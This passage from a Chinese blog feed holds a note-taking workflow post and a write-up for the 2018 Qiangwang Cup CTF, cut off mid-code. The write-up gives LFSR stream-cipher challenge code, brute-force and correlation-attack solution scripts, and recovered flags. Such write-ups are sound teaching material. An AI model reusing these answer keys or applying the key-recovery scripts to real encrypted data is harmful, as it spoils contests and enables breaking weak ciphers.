PS4</li></ul></li></ul></li><li><strong>准备</strong><ul><li>学习历史漏洞 - CVEs</li><li>挖掘新漏洞<ul><li>逆向分析+代码审计<ul><li>快速逆向与快速理解</li><li>对漏洞的理解</li></ul></li><li>模糊测试<ul><li>测试框架</li><li>样例生成的想法</li></ul></li></ul></li></ul></li></ul><h1 id="构建系统防护"><a href="#构建系统防护" class="headerlink" title="构建系统防护"></a>构建系统防护</h1><h2 id="研究与探索"><a href="#研究与探索" class="headerlink" title="研究与探索"></a>研究与探索</h2><ul><li>漏洞自动挖掘技术<ul><li>静态程序分析</li><li>符号执行</li><li>机器学习</li></ul></li><li>漏洞利用防护机制<ul><li>Intel SGX</li><li>控制流完整性（CFI）</li><li>拟态</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>有道云笔记markdown文档插入图片</title>
      <link href="/180327YnoteWithTypora/"/>
      <url>/180327YnoteWithTypora/</url>
      
        <content type="html"><![CDATA[<p>阶段性地优雅地解决了这个问题！</p><p>前段时间因为印象笔记同步出错我不得不购买其高级版本来恢复历史，但是它随着内容增多日渐卡顿这一点令人愈发难以忍受，此外，不支持markdown也一直如鲠在喉，于是我决定再试试之前因为广告问题不愿多用的有道云笔记，竟然发现它非常流畅，支持多层级目录，支持markdown，界面优雅，这让印象笔记之于它就像IE之于Chrome，没办法，我想我只能选择Chrome。</p><p>但是有道云也有些小问题，一是markdown不支持直接使用本地图片，二是不支持公式渲染。总的来说，它的markdown编辑功能和Typora比起来简直是小巫见大巫。稍加探索，发现一个有趣的情况，就是有道云笔记新建的markdown笔记就是以同名markdown格式文件保存在本地的，这样一来不就可以用Typora直接编辑了？</p><p>所以以后记笔记的工作流就变成了：</p><p>打开有道云笔记=&gt;新建markdown笔记foo.md=&gt;使用神器Everything搜索foo.md=&gt;用默认关联md文件的Typora打开=&gt;编辑md文件=&gt;回到有道云笔记，刷新文件预览（点到别的笔记，再回到<code>foo.md</code>，文件内容会重新加载）</p><p>非常完美。</p><p>Typora从<code>0.9.47</code>版本左右开始支持直接粘贴剪贴板图片，默认以时间戳为文件名保存到temp文件夹（可以在 <code>偏好设置-&gt;编辑器-&gt;图片插入</code> 中设置默认保存位置）来引用，并且支持直接复制到其他文件夹，真是非常棒的体验，必须感谢开发者！</p><p>另外，有道云不支持<code>C:\foo\bar.jpg</code> 的引用，但是<code>C:/foo/bar/jpg</code> 却可以被识别；Typora两者都可以识别。</p><p>所以当我们回到插入图片的问题，就会发现这不是问题了。只要在Typora编辑完毕后将所有图片复制到一个目录（比如<code>C:/foo/ynote/img</code>）下（如果后续Typora图片粘贴加入了自定义任意文件夹的功能，那么复制这一步也可省去了），然后<code>CTRL+H</code> 将所有图片引用地址中的目录部分一键替换成有道云笔记可解析的形式（如将<code>C:/Users/PCName/AppData/Local/Temp/</code>替换成<code>C:\foo\ynote\img\</code>），这样在有道云笔记和Typora中就都可以预览了。</p><p>那么<code>C:/foo/ynote/img</code> 下的图片岂不是就不可以同步了，是的，但比起清爽的体验这只是小节了，我们可以把该目录用坚果云等同步软件同步一下就好了。</p><p>话说回来，<code>坚果云+Typora+本地文件系统</code> 不就够了，还要什么自行车？</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>第二届强网杯全国网络安全挑战赛</title>
      <link href="/180325QWBWP/"/>
      <url>/180325QWBWP/</url>
      
        <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>使用stegsolve打开，在Analyse-&gt;Stereogram Solver 处改变偏移即可。</p><p><img src="1521988518362.png" alt="52198851836"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="streamgame1"><a href="#streamgame1" class="headerlink" title="streamgame1"></a>streamgame1</h2><p><strong><em>streamgame1.py</em></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">"flag&#123;"</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span> len(flag)==<span class="number">25</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R=int(flag[<span class="number">5</span>:<span class="number">-1</span>],<span class="number">2</span>)</span><br><span class="line">mask    =   <span class="number">0b1010011000100011100</span></span><br><span class="line"></span><br><span class="line">f=open(<span class="string">"key"</span>,<span class="string">"ab"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">    tmp=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        (R,out)=lfsr(R,mask)</span><br><span class="line">        tmp=(tmp &lt;&lt; <span class="number">1</span>)^out</span><br><span class="line">    f.write(chr(tmp))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><strong><em>solution</em></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">(key)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2</span>**<span class="number">19</span>):</span><br><span class="line">        R=k</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">            tmp,flag=<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">                (R,out)=lfsr(R,mask)</span><br><span class="line">                tmp=(tmp &lt;&lt; <span class="number">1</span>)^out</span><br><span class="line">            <span class="keyword">if</span>(chr(tmp)!=key[i]):</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"flag&#123;%s&#125;"</span>%bin(k)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">crack(open(<span class="string">'key'</span>,<span class="string">'rb'</span>).read())</span><br><span class="line"><span class="comment"># flag&#123;1110101100001101011&#125;</span></span><br></pre></td></tr></table></figure><h2 id="streamgame2"><a href="#streamgame2" class="headerlink" title="streamgame2"></a>streamgame2</h2><p><strong><em>streamgame2.py</em></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">"flag&#123;"</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span> len(flag)==<span class="number">27</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line">R=int(flag[<span class="number">5</span>:<span class="number">-1</span>],<span class="number">2</span>)</span><br><span class="line">mask=<span class="number">0x100002</span></span><br><span class="line"></span><br><span class="line">f=open(<span class="string">"key"</span>,<span class="string">"ab"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">    tmp=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        (R,out)=lfsr(R,mask)</span><br><span class="line">        tmp=(tmp &lt;&lt; <span class="number">1</span>)^out</span><br><span class="line">    f.write(chr(tmp))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><strong><em>solution</em></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">(key)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2</span>**<span class="number">21</span>):</span><br><span class="line">        R=k</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">            tmp=<span class="number">0</span></span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">                (R,out)=lfsr(R,mask)</span><br><span class="line">                tmp=(tmp &lt;&lt; <span class="number">1</span>)^out</span><br><span class="line">            <span class="keyword">if</span>(chr(tmp)!=key[i]):</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"flag&#123;%s&#125;"</span>%bin(k)[<span class="number">2</span>:]</span><br><span class="line">crack(open(<span class="string">'key'</span>,<span class="string">'rb'</span>).read())</span><br><span class="line"><span class="comment"># flag&#123;110111100101001101001&#125;</span></span><br></pre></td></tr></table></figure><h2 id="streamgame3"><a href="#streamgame3" class="headerlink" title="streamgame3"></a>streamgame3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">"flag&#123;"</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span> len(flag)==<span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></span><br><span class="line">    i = (R&amp;mask)&amp;<span class="number">0xffffff</span></span><br><span class="line">    </span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_round</span><span class="params">(R1,R1_mask,R2,R2_mask,R3,R3_mask)</span>:</span></span><br><span class="line"></span><br><span class="line">    (R1_NEW,x1)=lfsr(R1,R1_mask)</span><br><span class="line">    (R2_NEW,x2)=lfsr(R2,R2_mask)</span><br><span class="line">    (R3_NEW,x3)=lfsr(R3,R3_mask)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (R1_NEW, R2_NEW, R3_NEW, (x1*x2)^((x2^<span class="number">1</span>)*x3) )</span><br><span class="line"></span><br><span class="line">R1=int(flag[<span class="number">5</span>:<span class="number">11</span>],<span class="number">16</span>)</span><br><span class="line">R2=int(flag[<span class="number">11</span>:<span class="number">17</span>],<span class="number">16</span>)</span><br><span class="line">R3=int(flag[<span class="number">17</span>:<span class="number">23</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> len(bin(R1)[<span class="number">2</span>:])==<span class="number">17</span></span><br><span class="line"><span class="keyword">assert</span> len(bin(R2)[<span class="number">2</span>:])==<span class="number">19</span></span><br><span class="line"><span class="keyword">assert</span> len(bin(R3)[<span class="number">2</span>:])==<span class="number">21</span></span><br><span class="line"></span><br><span class="line">R1_mask=<span class="number">0x10020</span></span><br><span class="line">R2_mask=<span class="number">0x4100c</span></span><br><span class="line">R3_mask=<span class="number">0x100002</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fi <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">    <span class="keyword">print</span> fi</span><br><span class="line">    tmp1mb=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">        tmp1kb=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">            tmp=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">                (R1,R2,R3,out)=single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask)</span><br><span class="line">                tmp = (tmp &lt;&lt; <span class="number">1</span>) ^ out</span><br><span class="line">            tmp1kb+=chr(tmp)</span><br><span class="line"></span><br><span class="line">        tmp1mb+=tmp1kb</span><br><span class="line"></span><br><span class="line">    f = open(<span class="string">"./output/"</span> + str(fi), <span class="string">"ab"</span>)</span><br><span class="line">    f.write(tmp1mb)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><p><strong>solution</strong></p><p>如果两个随机二进制串不相关，那么将它们逐位比对，有1/2的概率相等，如果是三进制串，则概率为1/3，以此类推。写个小脚本验证一下：</p><p><img src="1525350802411.png" alt="1525350802411"></p><p>相反的，如果两个随机二进制串之间的存在关联，那么概率就不会是1/2了。</p><p>对于<code>x1,x2,x3∈{0,1}</code> 考虑逻辑运算  <code>out=(x1*x2)^((x2^1)*x3)</code>  ，</p><p>若<code>x2=0</code> ，则<code>out=x3</code> ，若<code>x2=1</code> 则<code>out=x1</code>  。</p><p>那么<code>p(out=x3) = p(out=x3|x2=0) * p(x2=0)+ p(out=x3|x2=1) * p(x2=1)=(1+1/2) * 1/2 = 3/4 != 1/2</code>  ，</p><p>对于x1同理有<code>p(out=x1)=3/4 != 1/2</code> 。</p><p>这个题目直观的想法和前两题一样，遍历R1，R2，R3三个寄存器所有可能的初始状态，但因为可能性过多在计算上是不可行的。上面提到的这种相关性提供了一种各个击破的思路：遍历R1的所有可能，计算其与out的相关性，逼近3/4的就可能是其初始状态，越逼近可能性越大，对R3同理。</p><p>这种基于相关性的攻击称为相关攻击（correlation attack），其分而治之的技巧可以降低爆破复杂度，比相关攻击复杂度更低的都可以称为快速相关攻击（也有一些经典的手法，不过目前还没很理解）。</p><p>本题采用相关攻击就可以在可接受时间内得到R1，R3的初始状态。</p><p>初始状态的可选空间越大，就需要越长的结果序列来判定。R1，R3分别大概7字节和17字节就足够了。</p><p><img src="1525353329312.png" alt="1525353329312"></p><p>然后爆破R2就不难了。</p><p><img src="1525356729608.png" alt="1525356729608"></p><p>全部代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">cipher=<span class="string">''</span>.join([bin(ord(i))[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> open(<span class="string">"output/0"</span>,<span class="string">"rb"</span>).read()])</span><br><span class="line">R1_mask=<span class="number">0x10020</span> ; R2_mask=<span class="number">0x4100c</span> ; R3_mask=<span class="number">0x100002</span></span><br><span class="line">R1_range=xrange(<span class="number">2</span>**<span class="number">16</span>,<span class="number">2</span>**<span class="number">17</span>)</span><br><span class="line">R2_range=xrange(<span class="number">2</span>**<span class="number">18</span>,<span class="number">2</span>**<span class="number">19</span>)</span><br><span class="line">R3_range=xrange(<span class="number">2</span>**<span class="number">20</span>,<span class="number">2</span>**<span class="number">21</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_round</span><span class="params">(R1,R1_mask,R2,R2_mask,R3,R3_mask)</span>:</span></span><br><span class="line">    (R1_NEW,x1)=lfsr(R1,R1_mask)</span><br><span class="line">    (R2_NEW,x2)=lfsr(R2,R2_mask)</span><br><span class="line">    (R3_NEW,x3)=lfsr(R3,R3_mask)</span><br><span class="line">    <span class="keyword">return</span> (R1_NEW, R2_NEW, R3_NEW, (x1*x2)^((x2^<span class="number">1</span>)*x3) )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcRelation</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    cnt=<span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> i,j <span class="keyword">in</span> zip(a,b):</span><br><span class="line">        cnt+=(i==j)</span><br><span class="line">    <span class="keyword">return</span> cnt/len(a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_most_related</span><span class="params">(R_range,R_mask,cmp_length)</span>:</span></span><br><span class="line">    real_R,relation=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> R_range:</span><br><span class="line">        R,tmp=i,<span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(cmp_length*<span class="number">8</span>):</span><br><span class="line">            R,out=lfsr(R,R_mask)</span><br><span class="line">            tmp+=str(out)</span><br><span class="line">        r=calcRelation(cipher[:cmp_length*<span class="number">8</span>],tmp)</span><br><span class="line">        <span class="keyword">if</span> r&gt;relation:</span><br><span class="line">            relation=r </span><br><span class="line">            real_R=i</span><br><span class="line">    <span class="keyword">return</span> (real_R,relation)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteR13</span><span class="params">()</span>:</span></span><br><span class="line">    R1,r=get_most_related(R1_range,R1_mask,<span class="number">7</span>)</span><br><span class="line">    R3,r=get_most_related(R3_range,R3_mask,<span class="number">17</span>)</span><br><span class="line">    <span class="keyword">return</span> (R1,R3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span><span class="params">()</span>:</span></span><br><span class="line">    R1_,R3_=bruteR13()</span><br><span class="line">    <span class="comment"># R1_,R3_=0x1b9cb,0x16b2f3</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"R1=%s,R3=%s"</span>%(R1_,R3_)</span><br><span class="line">    <span class="keyword">print</span> time.asctime()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> R2_range:</span><br><span class="line">        R1,R2,R3=R1_,i,R3_</span><br><span class="line">        res=<span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">            (R1,R2,R3,out)=single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask)</span><br><span class="line">            res+=str(out)</span><br><span class="line">        <span class="keyword">if</span> cipher[:len(res)]==res:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'flag&#123;'</span>+<span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:hex(x)[<span class="number">2</span>:],(R1_,i,R3_)))+<span class="string">'&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> time.asctime()</span><br><span class="line">brute()</span><br><span class="line"><span class="keyword">print</span> time.asctime()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Thu May 03 21:56:46 2018</span></span><br><span class="line"><span class="comment"># R1=113099,R3=1487603</span></span><br><span class="line"><span class="comment"># Thu May 03 22:01:41 2018</span></span><br><span class="line"><span class="comment"># flag&#123;1b9cb5979c16b2f3&#125;</span></span><br><span class="line"><span class="comment"># Thu May 03 22:02:41 2018</span></span><br><span class="line"><span class="comment"># [Finished in 357.3s]</span></span><br></pre></td></tr></table></figure><p>参考：<a href="http://blog.leanote.com/post/xp0intjnu@gmail.com/66c91498d13b" target="_blank" rel="noopener">http://blog.leanote.com/post/xp0intjnu@gmail.com/66c91498d13b</a> </p><h2 id="streamgame4"><a href="#streamgame4" class="headerlink" title="streamgame4"></a>streamgame4</h2><p><strong><em>streamgame4.py</em></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">"flag&#123;"</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span> len(flag)==<span class="number">27</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nlfsr</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    changesign=<span class="keyword">True</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> changesign:</span><br><span class="line">            lastbit &amp;= (i &amp; <span class="number">1</span>)</span><br><span class="line">            changesign=<span class="keyword">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line">R=int(flag[<span class="number">5</span>:<span class="number">-1</span>],<span class="number">2</span>)</span><br><span class="line">mask=<span class="number">0b110110011011001101110</span></span><br><span class="line"></span><br><span class="line">f=open(<span class="string">"key"</span>,<span class="string">"ab"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1024</span>*<span class="number">1024</span>):</span><br><span class="line">    tmp=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        (R,out)=nlfsr(R,mask)</span><br><span class="line">        tmp=(tmp &lt;&lt; <span class="number">1</span>)^out</span><br><span class="line">    f.write(chr(tmp))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><strong><em>solution</em></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> 